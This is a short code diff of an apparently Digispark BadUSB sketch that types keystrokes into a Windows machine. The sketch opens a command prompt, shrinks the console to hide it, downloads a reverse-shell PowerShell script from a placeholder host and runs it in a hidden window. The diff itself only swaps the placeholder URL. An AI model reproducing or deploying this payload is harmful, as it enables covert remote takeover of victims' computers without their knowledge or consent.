@@ -6,7 +6,7 @@ void setup() {
     DigiKeyboard.println("cmd");
     DigiKeyboard.delay(500);
     DigiKeyboard.println("mode con: cols=16 lines=1&color FE");
-    DigiKeyboard.println("cd Desktop&powershell (wget 'reverse_shell_code.ps1' -outfile a.ps1)&powershell -windowstyle hidden -file a.ps1");
+    DigiKeyboard.println("cd Desktop&powershell (wget '<reverse_shell_code.com>' -outfile a.ps1)&powershell -windowstyle hidden -file a.ps1");
 }
 void loop() {
 }
